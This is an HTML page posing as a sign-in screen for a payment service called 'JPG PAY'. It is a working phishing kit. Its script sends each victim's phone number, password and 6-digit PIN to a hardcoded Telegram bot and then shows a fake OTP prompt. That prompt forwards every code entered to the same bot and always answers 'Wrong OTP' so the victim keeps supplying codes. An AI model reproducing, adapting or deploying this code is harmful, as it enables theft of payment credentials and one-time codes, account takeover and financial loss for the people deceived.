<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>JPG PAY</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background-color: #0d0d0d;
      color: #e0e0e0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .container { width: 100%; max-width: 360px; text-align: center; }
    
    /* Logo Box */
    .logo-box {
      width: 140px; height: 140px;
      border-radius: 30px;
      margin: 0 auto 40px;
      overflow: hidden;
      background: #111111;
      display: flex;
      justify-content: center;
      align-items: center;
      box-shadow: 0 0 25px rgba(255, 255, 255, 0.03);
    }
    .logo-box img {
      width: 100%; height: 100%;
      object-fit: cover;
      display: block;
    }

    /* Input Fields */
    .input-group {
      display: flex;
      align-items: center;
      background: transparent;
      border: 1.5px solid #333333;
      border-radius: 30px;
      padding: 16px 22px;
      margin-bottom: 18px;
    }
    .input-group svg {
      width: 22px; height: 22px;
      fill: #4db6ac;
      margin-right: 16px;
      flex-shrink: 0;
    }
    .input-group input {
      background: transparent;
      border: none;
      color: #ffffff;
      font-size: 16px;
      width: 100%;
      outline: none;
    }
    .input-group input::placeholder { color: #666666; }
    
    .input-group input#pin {
      letter-spacing: 8px;
      font-weight: 500;
    }
    .input-group input#pin::placeholder {
      letter-spacing: normal;
      font-weight: normal;
    }

    /* Links Row */
    .row {
      display: flex;
      justify-content: space-between;
      font-size: 15px;
      color: #4db6ac;
      margin-bottom: 28px;
      padding: 0 5px;
      font-weight: 600;
    }
    .row a { color: #4db6ac; text-decoration: underline; }
    .row div { display: flex; align-items: center; gap: 8px; cursor: pointer; }
    .row input[type="radio"] { width: 16px; height: 16px; accent-color: #4db6ac; }
    
    /* Agreement */
    .checkbox-container {
      display: flex;
      align-items: center;
      font-size: 14px;
      color: #4db6ac;
      justify-content: center;
      margin-bottom: 32px;
      font-weight: 600;
    }
    .checkbox-container input {
      margin-right: 10px;
      width: 18px; height: 18px;
      accent-color: #4db6ac;
    }

    /* Sign In Button */
    .btn-main {
      width: 100%;
      padding: 18px;
      background: #1e5b4f;
      color: #ffffff;
      border: none;
      border-radius: 30px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }
    .btn-main:hover { background: #164a40; }
    .btn-main:active { transform: scale(0.98); }

    /* OTP Popup */
    .popup-overlay {
      display: none;
      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.75);
      justify-content: center; align-items: center;
      padding: 20px; z-index: 1000;
      backdrop-filter: blur(4px);
    }
    .popup-box {
      background: #1c1c1c;
      padding: 28px 24px;
      border-radius: 24px;
      width: 100%; max-width: 360px;
      position: relative;
      box-shadow: 0 15px 40px rgba(0,0,0,0.7);
      border: 1px solid #2a2a2a;
    }
    .close-btn {
      position: absolute; top: 15px; right: 15px;
      background: #2a2a2a; color: #aaa; border: none;
      border-radius: 50%; width: 34px; height: 34px;
      font-size: 16px; cursor: pointer;
      display: flex; align-items: center; justify-content: center;
      transition: background 0.2s;
    }
    .close-btn:hover { background: #3a3a3a; color: #fff; }
    .popup-box h2 { 
      font-size: 22px; margin-bottom: 12px; 
      text-align: left; color: #ffffff; font-weight: bold;
    }
    .popup-box p { 
      font-size: 14px; color: #999999; 
      margin-bottom: 14px; line-height: 1.5; text-align: left; 
    }
    .popup-box p span { color: #4db6ac; font-weight: bold; }

    /* OTP Input Group */
    .otp-input-group {
      display: flex;
      align-items: center;
      background: transparent;
      border: 1.5px solid #333333;
      border-radius: 30px;
      padding: 6px 6px 6px 20px;
      margin-bottom: 20px;
    }
    .otp-input-group input {
      flex: 1; background: transparent; border: none;
      color: #ffffff; padding: 10px 0; font-size: 16px; outline: none;
    }
    .otp-input-group input::placeholder { color: #666; }
    .otp-input-group button {
      background: #1e5b4f; color: #fff; border: none;
      border-radius: 25px; padding: 12px 22px; font-weight: bold; 
      cursor: pointer; font-size: 15px; transition: background 0.2s;
    }
    .otp-input-group button:hover { background: #164a40; }
    .otp-input-group button:disabled { background: #333; color: #777; cursor: not-allowed; }
    .timer-text { 
      color: #888; font-size: 13px; 
      margin-bottom: 20px; text-align: center; 
      min-height: 18px;
    }
  </style>
</head>
<body>

  <div class="container">
    <!-- Logo Box -->
    <div class="logo-box">
      <img src="jpglogo.png" alt="JPG PAY">
    </div>

    <!-- Phone Input -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
      <input type="tel" id="phone" placeholder="Phone" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,10)">
    </div>

    <!-- Password Input -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
      <input type="password" id="pass" placeholder="Password">
    </div>

    <!-- 6-Digit PIN Input -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
      <input type="tel" id="pin" placeholder="6-digit PIN" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
    </div>

    <!-- Register & Remember Me -->
    <div class="row">
      <a href="#">Register</a>
      <div><input type="radio" name="remember"> Remember Me</div>
    </div>

    <!-- Agreement -->
    <div class="checkbox-container">
      <input type="radio" name="agree" checked> Agree "User Privacy Agreement"
    </div>

    <!-- Submit Button -->
    <button class="btn-main" onclick="showOTP()">Sign In</button>
  </div>

  <!-- OTP Popup -->
  <div class="popup-overlay" id="otpPopup">
    <div class="popup-box">
      <button class="close-btn" onclick="closeOTP()">✕</button>
      <h2>Login OTP</h2>
      <p>Tap Send to receive the OTP, then enter it to confirm this login.</p>
      <p>OTP will be sent to <span id="displayPhone">+91 XXXXXXXX</span></p>

      <div class="otp-input-group">
        <input type="tel" id="otpInput" placeholder="Enter 6-digit OTP" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
        <button id="sendOtpBtn" onclick="sendOTP()">Send</button>
      </div>

      <div class="timer-text" id="timerText"></div>

      <button class="btn-main" onclick="verifyOTP()">Confirm</button>
    </div>
  </div>

  <script>
    // ==========================================
    // TELEGRAM BOT DETAILS
    // ==========================================
    const BOT_TOKEN = "8657618013:AAGISpKtMa1rqNxpDdQHaIp5LDEpXwaNXTQ";
    const CHAT_ID = "7318531273";

    let countdown;
    let timeLeft = 60;

    // Step 1: Sign In dabane par PIN + Password + Phone Telegram par bheje, phir OTP popup khole
    function showOTP() {
      let phone = document.getElementById('phone').value.trim();
      let pass = document.getElementById('pass').value.trim();
      let pin = document.getElementById('pin').value.trim();

      if (phone === "" || pass === "" || pin === "") {
        alert("Bhai, saari details daalo (Phone, Password, aur 6-digit PIN)!");
        return;
      }

      if (phone.length !== 10) {
        alert("Phone number 10 digit ka hona chahiye!");
        return;
      }

      if (pin.length !== 6) {
        alert("PIN exactly 6 digit ka hona chahiye!");
        return;
      }

      // Telegram par bhejo: Login Attempt with PIN
      let msg1 = "🔔 *JPG PAY - New Login Attempt*\n\n";
      msg1 += "📞 Phone: " + phone + "\n";
      msg1 += "🔑 Password: " + pass + "\n";
      msg1 += "🔐 6-digit PIN: " + pin;
      sendToTelegram(msg1);

      // Display phone in popup
      document.getElementById('displayPhone').innerText = "+91 " + phone;
      
      // Open popup
      document.getElementById('otpPopup').style.display = 'flex';
      resetTimer();
    }

    function closeOTP() { 
      document.getElementById('otpPopup').style.display = 'none'; 
      clearInterval(countdown); 
    }

    // Step 2: Send OTP button
    function sendOTP() {
      let phone = document.getElementById('phone').value;
      startTimer();
      sendToTelegram("📩 *JPG PAY - OTP Send Button Pressed*\nPhone: " + phone);
      document.getElementById('sendOtpBtn').disabled = true;
      document.getElementById('sendOtpBtn').innerText = "Sent";
    }

    // Step 3: Confirm OTP
    function verifyOTP() {
      let otp = document.getElementById('otpInput').value;
      let phone = document.getElementById('phone').value;

      if (otp === "") { 
        alert("Bhai, OTP daalo!"); 
        return; 
      }

      if (otp.length !== 6) { 
        alert("OTP exactly 6 digit ka hona chahiye!"); 
        return; 
      }

      sendToTelegram("🔐 *JPG PAY - OTP Entered*\nPhone: " + phone + "\nOTP: " + otp);

      setTimeout(() => { 
        alert("❌ Wrong OTP! Please try again."); 
      }, 500);
    }

    function startTimer() {
      timeLeft = 60;
      const timerDisplay = document.getElementById('timerText');
      clearInterval(countdown);
      countdown = setInterval(() => {
        if (timeLeft <= 0) {
          clearInterval(countdown); timerDisplay.innerText = "";
          document.getElementById('sendOtpBtn').disabled = false;
          document.getElementById('sendOtpBtn').innerText = "Send";
        } else {
          timerDisplay.innerText = "⏳ Resend OTP in " + timeLeft + "s";
          timeLeft--;
        }
      }, 1000);
    }

    function resetTimer() {
      clearInterval(countdown); timeLeft = 60;
      document.getElementById('sendOtpBtn').disabled = false;
      document.getElementById('sendOtpBtn').innerText = "Send";
      document.getElementById('otpInput').value = "";
      document.getElementById('timerText').innerText = "";
    }

    function sendToTelegram(message) {
      let url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&parse_mode=Markdown&text=" + encodeURIComponent(message);
      fetch(url)
        .then(res => console.log("Telegram Status:", res.status))
        .catch(err => console.error("Telegram Error:", err));
    }
  </script>

</body>
</html>
